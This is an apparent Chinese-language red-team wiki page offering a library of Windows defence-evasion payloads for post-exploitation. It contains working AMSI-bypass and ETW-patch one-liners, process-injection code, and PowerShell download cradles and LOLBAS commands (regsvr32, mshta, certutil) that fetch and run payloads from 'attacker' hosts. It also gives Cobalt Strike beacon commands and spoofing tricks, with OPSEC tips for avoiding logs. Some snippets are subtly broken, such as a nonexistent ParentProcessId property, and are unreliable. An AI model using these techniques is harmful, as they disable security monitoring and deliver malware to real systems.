# 内网/后渗透 — 免杀与规避 payload 库

> 父文档:[00-index.md](00-index.md) · ⚠️ SRC 场景下大多受限,见 [../compliance.md](../compliance.md)
> 涵盖:AMSI bypass / ETW patch / DLL sideload / 反沙箱 / unhook / Direct syscall / 混淆

---

### PowerShell免杀  `evasion-powershell`
PowerShell脚本免杀技术
子类：**PowerShell** · tags: `powershell` `evasion` `obfuscation`

**前置条件：** 目标机器访问权限；Windows系统

**攻击链：**

**1. 编码执行**  _[windows]_
_Base64编码执行_
```
powershell -enc BASE64_ENCODED_COMMAND
```

**2. 远程加载**  _[windows]_
_远程加载脚本_
```
IEX (New-Object Net.WebClient).DownloadString("http://attacker/script.ps1")
```

**3. 混淆变量名**  _[windows]_
_变量名混淆_
```
1='IEX'; 2='(New-Object Net.WebClient).DownloadString'; Invoke-Expression "1 2"
```

**4. 无文件执行**  _[windows]_
_隐藏窗口无配置文件执行_
```
powershell -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString(\"http://attacker/script.ps1\")"
```

**EDR 绕过变体：**

**1. 降级执行**
_使用PowerShell v2绕过日志_
```
powershell -version 2 -c "command"
```

**分析：** PowerShell免杀可以绕过杀毒软件检测执行恶意脚本。

**OPSEC：** PowerShell日志可能记录命令；考虑禁用日志；使用混淆技术

---

### AMSI绕过  `amsi-bypass`
绕过反恶意软件扫描接口
子类：**AMSI绕过** · tags: `amsi` `bypass` `evasion`

**前置条件：** PowerShell环境；AMSI启用

**攻击链：**

**1. 反射绕过**  _[windows]_
_通过反射禁用AMSI_
```
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
```

**2. 内存修补**  _[windows]_
_混淆版本绕过_
```
$a=[Ref].Assembly.GetTypes();ForEach($x in $a){if($x.Name -like "*iUtils"){$z=$x}};$y=$z.GetFields("NonPublic,Static");ForEach($x in $y){if($x.Name -like "*itFailed"){$x.SetValue($null,$true)}}
```

**3. DLL劫持**  _[windows]_
_通过DLL劫持绕过_
```
替换或劫持amsi.dll
```

**4. 使用工具**  _[windows]_
_使用现成工具_
```
Import-Module .\AmsiBypass.ps1
Invoke-AmsiBypass
```

---

### ETW Patch绕过  `etw-patch`
禁用ETW监控
子类：**ETW** · tags: `etw` `bypass` `evasion`

**前置条件：** 代码执行权限

**攻击链：**

**1. PowerShell禁用ETW**  _[windows]_
_PowerShell禁用ETW_
```
[System.Diagnostics.Eventing.EventProvider]::SetEnabled([System.Guid]::NewGuid(), 0, 0)
或
[Reflection.Assembly]::LoadWithPartialName("System.Diagnostics.Tracing") | Out-Null
$etw = [System.Diagnostics.Tracing.EventProvider]::new([Guid]::NewGuid())
$etw.SetEnabled(0)
```

**2. C#禁用ETW**  _[windows]_
_C#禁用ETW_
```
Assembly.Load("System.Diagnostics.Tracing")
Type etwType = typeof(EventProvider)
MethodInfo setEnabled = etwType.GetMethod("SetEnabled", BindingFlags.NonPublic | BindingFlags.Static)
setEnabled.Invoke(null, new object[] { Guid.NewGuid(), 0, 0 })
```

**3. 修补ntdll**  _[windows]_
_修补EtwEventWrite_
```
$ntdll = [Win32.Kernel32]::LoadLibrary("ntdll.dll")
$etwEventWrite = [Win32.Kernel32]::GetProcAddress($ntdll, "EtwEventWrite")
[Win32.Kernel32]::VirtualProtect($etwEventWrite, [uint32]1, 0x40, [ref]$oldProtect)
[Win32.Kernel32]::WriteProcessMemory(-1, $etwEventWrite, [byte[]](0xC3), 1, [ref]$bytesWritten)
```

---

### API Unhooking  `api-unhooking`
移除EDR的API Hook
子类：**Unhooking** · tags: `unhooking` `hook` `evasion`

**前置条件：** 代码执行权限

**攻击链：**

**1. 从磁盘还原**  _[windows]_
_从磁盘读取干净DLL_
```
$ntdll = [System.IO.File]::ReadAllBytes("C:\Windows\System32\ntdll.dll")
$proc = [System.Diagnostics.Process]::GetCurrentProcess()
$base = $proc.MainModule.BaseAddress
# 找到.text段并覆盖
```

**2. 从KnownDlls还原**  _[windows]_
_从KnownDlls还原_
```
$section = [Win32.Kernel32]::OpenFileMapping(0x4, $false, "\KnownDlls\ntdll.dll")
$map = [Win32.Kernel32]::MapViewOfFile($section, 0x4, 0, 0, 0)
# 复制干净的代码段
```

**3. Hell's Gate**  _[windows]_
_Hell's Gate技术_
```
通过系统调用号直接调用:
1. 解析NTDLL获取系统调用号
2. 直接执行syscall
3. 绕过用户模式Hook
```

---

### 进程注入  `process-injection`
将代码注入到其他进程
子类：**进程注入** · tags: `injection` `process` `evasion`

**前置条件：** 代码执行权限

**攻击链：**

**1. 经典DLL注入**  _[windows]_
_DLL注入_
```
$proc = Get-Process -Name notepad
$handle = [Win32.Kernel32]::OpenProcess(0x1F0FFF, $false, $proc.Id)
$addr = [Win32.Kernel32]::VirtualAllocEx($handle, 0, $dllPath.Length, 0x3000, 0x40)
[Win32.Kernel32]::WriteProcessMemory($handle, $addr, $dllPath, $dllPath.Length, [ref]0)
[Win32.Kernel32]::CreateRemoteThread($handle, 0, 0, $loadLibraryAddr, $addr, 0, [ref]0)
```

**2. Process Hollowing**  _[windows]_
_进程镂空_
```
1. CreateProcess(CREATE_SUSPENDED)
2. NtUnmapViewOfSection
3. VirtualAllocEx
4. WriteProcessMemory
5. ResumeThread
```

**3. APC注入**  _[windows]_
_APC队列注入_
```
$threadId = $proc.Threads[0].Id
$queueAPC = [Win32.Kernel32]::GetProcAddress($kernel32, "QueueUserAPC")
[Win32.Kernel32]::QueueUserAPC($queueAPC, $handle, $addr)
```

---

### AppLocker绕过  `applocker-bypass`
绕过AppLocker应用程序限制
子类：**AppLocker** · tags: `applocker` `bypass` `evasion`

**前置条件：** AppLocker限制环境

**攻击链：**

**1. 使用白名单路径**  _[windows]_
_使用白名单可执行文件_
```
C:\Windows\System32\spoolsv.exe
C:\Windows\System32\svchost.exe
C:\Program Files\Internet Explorer\ieexec.exe
```

**2. LOLBAS利用**  _[windows]_
_LOLBAS技术_
```
regsvr32.exe /s /n /u /i:http://attacker.com/shell.sct scrobj.dll
mshta.exe http://attacker.com/shell.hta
certutil.exe -urlcache -split -f http://attacker.com/shell.exe shell.exe
```

**3. InstallUtil**  _[windows]_
_InstallUtil绕过_
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shell.exe
```

**4. MSBuild**  _[windows]_
_MSBuild执行代码_
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe shell.csproj
```

---

### BlockDLLs技术  `evasion-blockdlls`
阻止非微软DLL加载
子类：**BlockDLLs** · tags: `evasion` `blockdlls` `edr`

**前置条件：** Windows系统；Cobalt Strike或其他工具

**攻击链：**

**1. Cobalt Strike BlockDLLs**  _[windows]_
_启用BlockDLLs_
```
beacon> blockdlls start
阻止非微软签名的DLL加载
beacon> blockdlls stop
恢复DLL加载
```

**2. 进程创建时启用**  _[windows]_
_进程创建时启用_
```
使用CREATE_SUSPENDED标志创建进程
设置ProcessSignaturePolicy
阻止EDR DLL注入
```

**3. C#实现**  _[windows]_
_C#实现BlockDLLs_
```
[DllImport("kernel32.dll")]
static extern bool SetProcessMitigationPolicy(...);
ProcessSignaturePolicy policy = new ProcessSignaturePolicy();
policy.SignatureLevel = 0x0F;
SetProcessMitigationPolicy(ProcessMitigationPolicy.Signature, ref policy, size);
```

---

### Shellcode加密  `evasion-shellcode-encrypt`
加密Shellcode绕过静态检测
子类：**Shellcode加密** · tags: `evasion` `shellcode` `encrypt`

**前置条件：** Shellcode；加密工具

**攻击链：**

**1. AES加密Shellcode**
_AES加密_
```
使用工具加密:
python shellcode_encoder.py --input shellcode.bin --output encoded.bin --key randomkey
生成加密的Shellcode和解密代码
```

**2. XOR加密**
_XOR加密_
```
简单XOR加密:
for i in range(len(shellcode)):
    encoded[i] = shellcode[i] ^ key[i % len(key)]
运行时解密执行
```

**3. RC4加密**
_RC4加密_
```
使用RC4加密Shellcode:
from Crypto.Cipher import ARC4
cipher = ARC4.new(key)
encrypted = cipher.encrypt(shellcode)
运行时使用相同密钥解密
```

**4. 多态加密**
_多态加密_
```
每次生成不同的解密代码:
- 随机密钥
- 随机解密顺序
- 添加垃圾指令
- 控制流混淆
```

---

### 进程伪装  `evasion-process-masq`
伪装进程名称和路径
子类：**进程伪装** · tags: `evasion` `process` `masquerade`

**前置条件：** Windows系统

**攻击链：**

**1. PPID欺骗**  _[windows]_
_PPID欺骗_
```
Cobalt Strike:
beacon> ppid 1234
设置父进程ID为合法进程
beacon> run [command]
新进程继承合法父进程
```

**2. 进程参数欺骗**  _[windows]_
_参数欺骗_
```
CreateProcess参数:
- lpApplicationName: 合法程序路径
- lpCommandLine: 包含恶意命令
- 显示为合法进程
```

**3. 进程镂空**  _[windows]_
_进程镂空_
```
1. 创建合法进程(挂起状态)
2. 写入恶意代码
3. 恢复线程执行
进程名显示为合法程序
```

---

### PPID欺骗  `evasion-ppid-spoof`
伪造父进程ID
子类：**PPID欺骗** · tags: `evasion` `ppid` `spoofing`

**前置条件：** Windows系统；父进程句柄

**攻击链：**

**1. PowerShell实现**  _[windows]_
_PowerShell PPID欺骗_
```
$parent = Get-Process -Name explorer
$pi = New-Object System.Diagnostics.ProcessStartInfo
$pi.FileName = "cmd.exe"
$pi.ParentProcessId = $parent.Id
[System.Diagnostics.Process]::Start($pi)
```

**2. C#实现**  _[windows]_
_C#实现_
```
[StructLayout(LayoutKind.Sequential)]
public struct STARTUPINFOEX {
    public STARTUPINFO StartupInfo;
    public IntPtr lpAttributeList;
}
使用PROC_THREAD_ATTRIBUTE_PARENT_PROCESS属性
```

**3. Cobalt Strike**  _[windows]_
_Cobalt Strike实现_
```
beacon> ppid [explorer_pid]
beacon> run notepad.exe
新进程父进程为explorer.exe
```

---

### DLL侧加载  `evasion-dll-sideloading`
利用DLL搜索顺序加载恶意DLL
子类：**DLL侧加载** · tags: `evasion` `dll` `sideloading`

**前置条件：** Windows系统；可执行文件

**攻击链：**

**1. DLL劫持**  _[windows]_
_DLL劫持原理_
```
1. 找到可执行文件加载的DLL
2. 将恶意DLL放在搜索路径优先位置
3. 执行程序时加载恶意DLL
```

**2. DLL转发**  _[windows]_
_DLL转发_
```
#pragma comment(linker, "/export:OriginalFunction=original.dll.OriginalFunction")
导出原始DLL的函数
同时执行恶意代码
```

**3. 常见目标**  _[windows]_
_常见目标DLL_
```
常见DLL劫持目标:
- version.dll
- dwmapi.dll
- uxtheme.dll
- cryptsp.dll
- winmm.dll
```

---

### 参数欺骗  `evasion-arg-spoofing`
欺骗进程参数显示
子类：**参数欺骗** · tags: `evasion` `argument` `spoofing`

**前置条件：** Windows系统

**攻击链：**

**1. 命令行欺骗**  _[windows]_
_命令行欺骗_
```
CreateProcess参数:
lpApplicationName = "C:\Windows\System32\cmd.exe"
lpCommandLine = "C:\Windows\System32\cmd.exe /c whoami"
实际执行恶意命令
```

**2. 环境变量欺骗**  _[windows]_
_环境变量欺骗_
```
使用环境变量隐藏参数:
set EVIL=malicious_command
cmd /c %EVIL%
进程列表不显示实际命令
```

**3. PEB修改**  _[windows]_
_PEB修改_
```
修改PEB中的命令行:
1. 创建进程
2. 修改PEB中的CommandLine缓冲区
3. 进程管理器显示假参数
```

---

### 签名二进制利用  `evasion-signed-binary`
利用微软签名二进制执行代码
子类：**签名二进制** · tags: `evasion` `signed` `lolbin`

**前置条件：** Windows系统

**攻击链：**

**1. MSBuild**  _[windows]_
_MSBuild执行_
```
msbuild.exe malicious.csproj
执行嵌入的C#代码
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
```

**2. InstallUtil**  _[windows]_
_InstallUtil执行_
```
InstallUtil.exe /logfile= /LogToConsole=false /U malicious.dll
执行.NET程序集
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
```

**3. Regsvcs/Regasm**  _[windows]_
_Regsvcs/Regasm_
```
regsvcs.exe malicious.dll
regasm.exe malicious.dll
执行.NET程序集
```

**4. Rundll32**  _[windows]_
_Rundll32执行_
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"
rundll32.exe shell32.dll,Control_RunDLL malicious.cpl
```

---

### CLR注入  `evasion-clr-injection`
CLR内存注入技术
子类：**CLR注入** · tags: `evasion` `clr` `injection`

**前置条件：** Windows系统；.NET环境

**攻击链：**

**1. CLR内存加载**  _[windows]_
_CLR加载原理_
```
使用CLR接口加载.NET程序集:
1. 获取CLR运行时
2. 创建AppDomain
3. 加载程序集
4. 执行入口点
```

**2. C#实现**  _[windows]_
_C# CLR加载_
```
var clr = new ClrModule();
clr.LoadAssembly(File.ReadAllBytes("malicious.exe"));
clr.Execute("Main");
从内存执行.NET程序
```

**3. Cobalt Strike**  _[windows]_
_Cobalt Strike实现_
```
beacon> execute-assembly /path/to/tool.exe args
从内存执行.NET程序集
不落地执行
```

---



---

← 回 [00-index.md](00-index.md) · 上一篇:[`12-privesc.md`](12-privesc.md) · 下一篇:[`14-domain.md`](14-domain.md)
